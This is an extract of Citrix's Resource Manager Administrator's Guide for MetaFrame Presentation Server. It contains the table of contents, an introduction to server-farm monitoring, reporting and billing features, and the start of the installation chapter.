NetView are registered trademarks of International Business Machines Corp. in the U.S. and other countries. Unicenter is a registered trademark of Computer Associates International, Inc. All other trademarks and registered trademarks are the property of their owners. Last Updated: January 9, 2004 (SC)
Go to Document Center
Contents 3
Contents
Chapter 1 Introduction
Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 9 About this Guide . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 9 Accessing Documentation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 10 Introducing Resource Manager . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 11 Monitoring Your Existing Server Farm . . . . . . . . . . . . . . . . . . . . . . . . . . 11 Identifying, Diagnosing, and Solving Problems. . . . . . . . . . . . . . . . . . . . 11 Gauging and Justifying Future Resource Needs . . . . . . . . . . . . . . . . . . . 12 Planning and Scaling Your Server Farm . . . . . . . . . . . . . . . . . . . . . . . . . 12 Billing Users for Resource Usage . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 12 New Features in this Release . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 12 Extended Reporting Capabilities . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 12 Extended Real Time Monitoring Capabilities . . . . . . . . . . . . . . . . . . . . . . . . . . 13 Enhanced Delegated Administration . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 14 Failed Import Alerts . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 14 License Server Connection Failure Alerts . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 14 What to Read Next . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 15
Chapter 2
Installing Resource Manager
Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 17 Software Requirements . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 17 Licensing Information. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 18 Installing Resource Manager . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 18 Before You Start . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 18 Selecting a Server to Use as the Farm Metric Server. . . . . . . . . . . . . . . . 19 If You Are Upgrading from a Previous Version . . . . . . . . . . . . . . . . . . . . . . . . 19 Installing or Upgrading Resource Manager . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19 Uninstalling Resource Manager . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20 Setting Up a Summary Database . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 21 Setting a System Data Source Name . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 22 Configuring a Database Connection Server . . . . . . . . . . . . . . . . . . . . . . . . . . . . 24 Turning the Summary Database On . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 25 Turning the Summary Database Off . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 26
4
Resource Manager Administrator’s Guide
Go to Document Center
Displaying Resource Manager and its Components . . . . . . . . . . . . . . . . . . . . . . . . 27 Displaying the Main Resource Manager Screen . . . . . . . . . . . . . . . . . . . . . . . . 28 Displaying Resource Manager for the Entire Server Farm . . . . . . . . . . . . . . . . 29 Displaying Resource Manager for a Single Server . . . . . . . . . . . . . . . . . . . . . . 29 Displaying the Applications in a Server Farm . . . . . . . . . . . . . . . . . . . . . . . . . . 29 Changing the Location of Resource Manager After Installation . . . . . . . . . . . . . . 30
Chapter 3
Monitoring Servers and Applications in Real Time
Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 31 Configuring Metrics on Servers. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 32 Checking the Status of Server Metrics . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 33 Customizing Server Metrics . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 34 Monitoring the Disk on a Server with Windows 2000 or Later installed 34 Configuring Application Metrics. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 35 Monitoring Your Farm. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 35 Suspending Notification of a Metric’s Status . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 36 Preparing Your System for Resource Manager Alerts . . . . . . . . . . . . . . . . . . . . . . 36 Preparing Your System for Email Alerts . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 37 Using MAPI to Send Alerts . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 38 Setting up SSL for SMTP Email Alerts . . . . . . . . . . . . . . . . . . . . . . . . . . 39 Preparing Your System for SMS Alerts . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 40 Configuring Resource Manager to Use SMS . . . . . . . . . . . . . . . . . . . . . . 40 Preparing Your System for SNMP Alerts . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 40 Getting More Information About Metrics and Monitoring. . . . . . . . . . . . . . . . . . . 41
Chapter 4
Recording the History of Servers and Applications
Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 43 How Does Resource Manager Information get into a Summary Database? . . . . . 43 What Information Should I Record in the Database? . . . . . . . . . . . . . . . . . . . . . . . 45 Issues to Consider when Selecting Database Information. . . . . . . . . . . . . . . . . 45 The Benefits of Keeping Long-Term Resource Manager Information . . 45 Deciding Which Metrics Information to Store. . . . . . . . . . . . . . . . . . . . . 45 How Can Recording a Metric Affect Database Growth?. . . . . . . . . . . . . 46 Selecting Server and Application Metrics to Record in the Database. . . . . . . . 46 Using Farm-Wide Options for Reducing Summary Data . . . . . . . . . . . . . . . . . 46 Scheduling Summary Data Collection and Removal . . . . . . . . . . . . . . . . . . . . . . . 47 Ignoring Server Metrics During Periods of Low Server Activity . . . . . . . . . . . 47 Removing Unwanted Information from the Database . . . . . . . . . . . . . . . . . . . . 47
Go to Document Center
Contents 5
Setting a Purging Schedule. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 48 Setting the Summary Database Update Time . . . . . . . . . . . . . . . . . . . . . . . . . . 48 Monitoring the Status of the Summary Database . . . . . . . . . . . . . . . . . . . . . . . . . . 49 Managing the Resource Manager Summary Database . . . . . . . . . . . . . . . . . . . . . . 52 Estimating Summary Database Growth . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 53 Managing Summary Database Growth . . . . . . . . . . . . . . . . . . . . . . . . . . 54
Chapter 5
Reporting and Analyzing Resource Manager Information
Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 55 Generating Reports to Analyze Data . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 56 Creating Reports on Current Activity . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 56 Reporting on the Use of Processes or Applications . . . . . . . . . . . . . . . . . . . . . . 57 Reporting on User Activity. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 59 Looking Back to a Specific Time on a Server . . . . . . . . . . . . . . . . . . . . . . . . . . 60 Creating Reports on Past Activity . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 61 Looking Back at Specific Processor Application Usage . . . . . . . . . . . . . . . . . . 61 Looking Back at Specific Users’ Activities . . . . . . . . . . . . . . . . . . . . . . . . . . . . 63 Looking Back at Activities on a Specific Server . . . . . . . . . . . . . . . . . . . . . . . . 65 How Reports from Servers in Different Time Zones or Locales are Displayed. . . 67 What if a Reporting Server Uses a Different Time Zone?. . . . . . . . . . . . . . . . . 67 What if a Reporting Server Uses a Different Language?. . . . . . . . . . . . . . . . . . 67 Estimating the Concurrent User Capacity of a Server. . . . . . . . . . . . . . . . . . . . . . . 68
Chapter 6
Billing Users for Resource Usage
Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 69 Creating a Fee Profile. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 69 Organizing Users into Cost Centers for Billing. . . . . . . . . . . . . . . . . . . . . . . . . . . . 70 Producing Billing Reports . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 70 Cost Centers Report . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 70 Domain Users Report . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 70 How Information Is Presented in the Report . . . . . . . . . . . . . . . . . . . . . . . . . . . 71 User. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 71 Session Start . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 71 Session Elapsed Time. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 71 Process . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 71 CPU Time Used . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 71 Memory Used . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 71 Process Loaded Time . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 71
6
Resource Manager Administrator’s Guide
Go to Document Center
Process Active Time. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 72 Cost. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 72 Fee Profile . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 72
Chapter 7
Troubleshooting
Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 73 Unexpected Behavior . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 73 Locating Servers. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 76
Chapter 8
Using the Monitoring and Reporting Extensions
Monitoring Server Metrics. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 77 Creating Reports. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 78 Unexpected Behavior . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 79
Appendix A
Default Metric Set . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .81
Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 81 Default Set of Metrics . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 82 Data Store Connection Failure . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 82 Minutes . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 82 License Server Connection Failure. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 82 Minutes . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 82 Logical Disk . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 82 % Disk Time. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 82 % Free Space . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 83 Memory . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 83 Available Bytes . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 83 Pages/sec. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 83 Network Interface . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 84 Bytes Total/sec . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 84 Paging File . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 84 % Usage . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 84 Processor . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 84 % Interrupt Time . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 84 % Processor Time. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 84 System . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 85 Context Switches/sec . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 85 Terminal Services . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 85 Active Sessions. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 85
Go to Document Center
Contents 7
Inactive Sessions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 85
Appendix B
Summary Database Schema . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .87
Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 87 Database Entity Relationship Diagram . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 87 Database Entity Table Descriptions. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 89 Application History. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 89 SDB_APPHISTORY . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 89 Application Metrics . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 90 SDB_APPMETRICS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 90 Client History . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 91 SDB_CLIENTHISTORY. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 91 Connection History . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 92 SDB_CONNECTIONHISTORY . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 92 Event Log . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 93 SDB_EVENTLOG . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 93 Administrator Configurable Server Metrics. . . . . . . . . . . . . . . . . . . . . . . . . . . . 94 SDB_METRICS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 94 Processes . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 95 SDB_PROCESS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 95 User Information. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 98 SDB_SESSION . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 98 Version Control. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 100 SCHEMAVERSION . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 100 Support and Look-Up Tables . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 100 LU_APPNAME . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 100 LU_CLIENT. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 101 LU_CLIENTPROPERTIES . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 101 LU_CLIENTTYPEMAPPINGS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 102 LU_FARMNAME . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 102 LU_INSTANCE . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 103 LU_LAUNCHER . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 103 LU_METRIC . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 104 LU_METRICCOUNTER. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 105 LU_NETDOMAIN. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 105 LU_OBJECT . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 106 LU_PATH . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 106 LU_PROCESS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 107 LU_PROCESSNAME . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 108
8
Resource Manager Administrator’s Guide
Go to Document Center
LU_SERVER . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 108 LU_SERVERNAME . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 109 LU_SERVERINF . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 110 LU_WINSTATION . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 111 SDB_SCRATCH . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 111 SDB_HEURISTICS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 112 String Length Table . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 113 SQL Data Type Mapping. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 114
Appendix C
Glossary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .115
Index . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 119
Go to Document Center
CHAPTER 1
Introduction
Overview
Welcome to Resource Manager for MetaFrame Presentation Server. This chapter introduces you to the documentation and to Resource Manager. Topics include: • • • • • How to use this guide Accessing documentation in general An introduction to Resource Manager What’s new in this release Details of where to find more information about Resource Manager
About this Guide
This guide is for MetaFrame administrators responsible for installing, configuring, and maintaining Resource Manager. This guide is designed to introduce you to the key concepts of Resource Manager, and to get you started quickly and easily. This chapter introduces the documentation and the Resource Manager product, and describes what’s new in this release. Subsequent chapters provide an overview of how to deploy and configure Resource Manager, and provide you with a summary of the main ways you can use it in your deployment. This guide assumes knowledge of MetaFrame Presentation Server. If you will be recording the history of server and application metrics using the summary database, you need to be familiar with Microsoft SQL server or Oracle DBMS. For detailed information on how to carry out the Resource Manager procedures outlined in this guide, see the Resource Manager Help.
10
Resource Manager Administrator’s Guide
Go to Document Center
Accessing Documentation
This administrator’s guide is part of the MetaFrame Presentation Server documentation set. The documentation set includes online guides that correspond to different features of MetaFrame Presentation Server. Online documentation is provided as Adobe Portable Document Format (PDF) files. Use the Document Center to access the complete set of online guides. The Document Center provides a single point of access to the documentation that enables you to go straight to the section of documentation that you need. The Document Center includes: • • • A list of common tasks and a link to each item of documentation. A search function that covers all the PDF guides. This is useful when you need to consult a number of different guides. Cross-references between documents. You can move between documents as often as you need using the links to other guides and the links to the Document Center.
Important To view, search, and print the PDF documentation, you need to have the Adobe Acrobat Reader 5.0.5 with Search or a later version with Search. You can download Adobe Acrobat Reader for free from Adobe Systems’ Web site at <a href="http://www.adobe.com/" target="_blank">http://www.adobe.com/</a>. If you prefer to access the guides without using the Document Center, you can navigate to the component PDF files using Windows Explorer. If you prefer to use printed documentation, you can also print each guide from Acrobat Reader. More information about Citrix documentation, and details about how to obtain further information and support, is included in Getting Started with MetaFrame Presentation Server.
Go to Document Center
Chapter 1 Introduction
11
Introducing Resource Manager
You can use Resource Manager to manage resources on single or multiple MetaFrame Presentation Server computers. Resource Manager enables you to collect, display, store, and analyze data about system performance, application or process use, and user activity. Use Resource Manager to: • • • Watch what is happening at a particular moment for a system. This is known as real-time monitoring. Analyze and report using records of system activity. You can create reports for current activities or create reports on past activities using a summary database. Create Billing reports to charge users for their use of resources using a summary database.
Resource Manager can track and store information about a wide variety of system and network processes and events. These are known as metrics. If the value of a metric falls outside normal limits, Resource Manager can inform you. During installation, Resource Manager automatically creates a set of default metrics and assigns limits to define the normal operation of each one. Tip Resource Manager can track any Windows Performance Monitor counter as a server metric. Further information on these counters is available in Appendix C of the MetaFrame Presentation Server Administrator’s Guide and the Microsoft Windows Help for Performance Monitor. You can use Resource Manager in your server farm to help you with the following tasks:
Monitoring Your Existing Server Farm
You can use Resource Manager to monitor and analyze system performance, loading, and user behavior. You can view information about an entire server farm, analyze individual servers and applications, or monitor specific aspects of performance. By fine-tuning the monitoring process, you can customize the information that Resource Manager provides to suit your specific environment.
Identifying, Diagnosing, and Solving Problems
Resource Manager can warn you about any developing problems in your environment. If a problem does occur, you can analyze the relevant data to help you decide what action to take.
12
Resource Manager Administrator’s Guide
Go to Document Center
Gauging and Justifying Future Resource Needs
You can produce reports about system usage that help you identify requirements for future resources, such as new servers or additional licenses.
Planning and Scaling Your Server Farm
By deploying Resource Manager on a pilot system, you can gauge how the server farm will cope in different possible scenarios. This will help you to scale your network, set baselines, and spot potential problems before they affect the final installation. For example, you can evaluate whether or not a particular server can support the activity of the desired number of users.
Billing Users for Resource Usage
You can produce Billing reports that use the resource usage data from the summary database and a fee profile to calculate the charges for users of the server farm. You define fee profiles to reflect different charging rates and currencies. When Resource Manager generates a Billing report, it calculates the charges by multiplying the resources used during the report period by the associated fees.
New Features in this Release
This release of Resource Manager includes the following new features and enhancements.
Extended Reporting Capabilities
The Report Center is one of the system management tools provided through the Access Suite Console. The Access Suite Console snaps into the Microsoft Management Console to provide a central location for system management tools. You can also use it to launch other consoles such as the MetaFrame Presentation Server Console. The Report Center extends Resource Manager reporting capabilities, and allows you to easily generate reports from a variety of real-time and historical data sources. A wizard helps you select the type of report, the data to be displayed, and the schedule for running the report. You can view the status of your scheduled report, and, for those that have not been run, you can adjust the report parameters. The Report Center contains several report types, for example: • Application Availability report. Lists the published applications in a farm and the percentage of time when they were available, in a planned down state, and in an unplanned down state.
Go to Document Center
Chapter 1 Introduction
13
•
Server Availability report. Lists the servers in a farm and the percentage of time when they were available, in a planned down state, and in an unplanned down state. Server Performance report. Displays, for the selected servers, the average CPU utilization, the minimum memory available, and the maximum number of concurrent connections. The report also contains details of the most heavily loaded servers. Application report. Provides details of all published applications including the servers they are published on, users and groups with access to them, and any options used by clients that connect to the applications. Application Usage report. Shows the most frequently used applications, the number of times each application has been accessed, and the maximum number of concurrent users.
•
•
•
For further details of how to use the Report Center, see the assistance provided on the Report Center screens and “Using the Monitoring and Reporting Extensions” on page 77.
Extended Real-Time Monitoring Capabilities
The Dashboard on the Access Suite Console allows you to display performance metrics for the servers in a farm in a highly visual way. You can create custom views of farms, zones, servers, and applications by using the My Views feature. My Views allows you to create and save customized views of items in your deployment. You can then see updated information about those items at any time, without having to search for them. For example, you can group related objects in folders or you can order farms, according to the frequency with which you need to access them. You may want to monitor farms located in different locations. In this case, you could use the My Views feature to create a custom view that groups each farm in a different part of the screen and then use a background graphic to identify each location. A suitable performance metric, such as CPU Load, displayed in your custom view, allows you to pinpoint problems quickly on any server in any location. Using custom views in this way helps you anticipate or identify problems with your servers or applications as soon as possible. Note that these servers must be running the MetaFrame Presentation Server Provider for Microsoft Windows Management Instrumentation. For further information, see the assistance provided on the Access Suite Console screens and “Using the Monitoring and Reporting Extensions” on page 77.
14
Resource Manager Administrator’s Guide
Go to Document Center
Enhanced Delegated Administration
Enhanced delegated administration in Resource Manager allows you to delegate the tasks of controlling applications and analyzing system and application data to custom administrators. For more information on Enhanced Delegated Administration, see the MetaFrame Presentation Server Administrator’s Guide. To simplify the configuration of custom administrators, full administrators may find it easier to first create a suitable folder hierarchy, and then create custom administrators with the necessary permissions. You create custom administrators using the Add MetaFrame Administrator wizard in the Presentation Server Console. For Resource Manager you can: • Delegate the control of Resource Manager applications to custom administrators. A Resource Manager application is an application that is not a MetaFrame Presentation Server published application but is still recognized by the Resource Manager system. Details of how to set up Resource Manager applications are provided in the Help. Determine which custom administrators can generate current reports, summary reports, or Billing reports Ensure that administrators receive alerts only for those servers for which they have responsibility
• •
Failed Import Alerts
Resource Manager warns you of failed attempts to update the summary database, and can be configured to send alerts under these circumstances. In its red state, a new icon on the Summary Database tab identifies failures to commit any record in the last attempted update to the database, and the Summary Database Configuration dialog box allows you to notify administrators of any such failure. For further information, see “Monitoring the Status of the Summary Database” on page 49 and “Setting Up a Summary Database” on page 21.
License Server Connection Failure Alerts
With the Citrix MetaFrame Access Suite Licensing feature, Citrix licensing is handled by one or more license servers. MetaFrame Presentation Server computers communicate with license servers to ensure that client sessions are licensed appropriately. A license server connection failure alert is raised when a server cannot communicate with its associated license server. This may be due to a hardware failure on the license server, the license service on the license server malfunctioning, or network problems between the license server and the MetaFrame Presentation Server computer.
Go to Document Center
Chapter 1 Introduction
15
When contact with a license server is lost, the MetaFrame Presentation Server computer lapses into a licensing grace period. Typically, the licensing grace period is 96 hours. During this period, the MetaFrame Presentation Server software is fully functional and connections to the server work normally. Contact with the license server must be reestablished before the grace period ends, or the software is reduced automatically to single user mode and only the administrator can log on to the server. For further information, see “Preparing Your System for Resource Manager Alerts” on page 36.
What to Read Next
This guide provides: • • • • Installation instructions. An overview of the tasks that you carry out using Resource Manager. For stepby-step instructions on how to carry out Resource Manager tasks see the Help. Detailed information on Resource Manager-related tasks that you carry out using other tools or products. Reference information.
Refer to Chapter 2: “Installing Resource Manager” Chapter 3: “Monitoring Servers and Applications in Real Time” Chapter 4: “Recording the History of Servers and Applications” Chapter 5: “Reporting and Analyzing Resource Manager Information” Chapter 6: “Billing Users for Resource Usage”
To find Instructions about installing Resource Manager An overview of real-time monitoring An overview of how to record the history of servers and applications using a summary database An overview of how to generate reports from stored Resource Manager information An overview of how to charge users for resource usage using summary database information Answers to common questions about Resource Manager Procedures for using the reporting and monitoring extensions
Chapter 7: “Troubleshooting” Chapter 8: “Using the Reporting and Monitoring Extensions”
16
Resource Manager Administrator’s Guide
Go to Document Center
Details about the default metrics that are configured during installation Definitions, layout, and organization of summary database schema Definitions of the technical terms used in this guide
Appendix A: “Default Metric Set” Appendix B: “Summary Database Schema” Appendix C: “Glossary”
Go to Document Center
CHAPTER 2
Installing Resource Manager
Overview
This chapter explains how to install Resource Manager. Topics include: • • • • • • • Issues to consider before you start, including software requirements and licensing information Installation instructions How to upgrade to the latest version of Resource Manager An overview of the user interface and navigation How to set up a summary database, including setting up a system data source name (DSN) and Database Connection Server How to turn the summary database on and off How to change the location of Resource Manager after installation
Software Requirements
You install Resource Manager when you install or upgrade your servers to MetaFrame Presentation Server 3.0, Enterprise Edition for Windows. If you are upgrading from a previous release of MetaFrame Presentation Server, it is not necessary for Resource Manager to have been installed previously. For guidelines about the licensing requirements for MetaFrame Presentation Server or other components, see the MetaFrame Access Suite Licensing Guide.
18
Resource Manager Administrator’s Guide
Go to Document Center
If you are going to record the history of server and application metrics using the summary database, you need one of the following DBMS packages: • • Microsoft SQL Server Versions 7 or 2000 Oracle Database Versions 7, 8i, or 9i —Or—
Licensing Information
Full Resource Manager functionality requires a MetaFrame Presentation Server Enterprise Edition license. Refer to the MetaFrame Access Suite Licensing Guide for further details.
Installing Resource Manager
Before You Start
Before you install Resource Manager, Citrix recommends that you do the following: • Ensure that the servers on which you are going to install Resource Manager meet the software requirements listed in “Software Requirements” on page 17. Resource Manager stores recent information about applications, servers, and users in a local database that can become large if the server is heavily loaded. If this may cause an issue in the future, you can select an alternative installation location for Resource Manager. See “Installing or Upgrading Resource Manager” on page 19 for more information. Ensure that each server on which Resource Manager is to be installed can connect to a data store. The data store is a database that MetaFrame Presentation Server and its components use to keep track of configuration information about the servers, applications, and configured users in the server farm. You set up a data store during MetaFrame Presentation Server installation. Resource Manager uses this data store. If you are going to use a summary database, you need to install DBMS software on a server. This computer is the database storage facility for your server farm’s summary data. It does not need to be a farm server but must be available to the farm servers through the network. Ensure that this server has enough available space to store the summary database. Refer to “Managing the Resource Manager Summary Database” on page 52.
•
•
Go to Document Center
Chapter 2 Installing Resource Manager
19
Selecting a Server to Use as the Farm Metric Server
By default, the first server on which you install Resource Manager becomes the Farm Metric Server. The Farm Metric Server interprets metrics that apply to the entire server farm (for example, application counts) and sends alerts when required. Citrix recommends that the Farm Metric Server be lightly loaded and, preferably, be a MetaFrame Presentation Server data collector. If necessary, you can change the Farm Metric Server to a different machine after installation. For more information, see the Help. The second server on which you install Resource Manager becomes the backup Farm Metric Server. If these servers will experience heavy loading or are not data collectors, specify different servers to be the Farm Metric Servers.
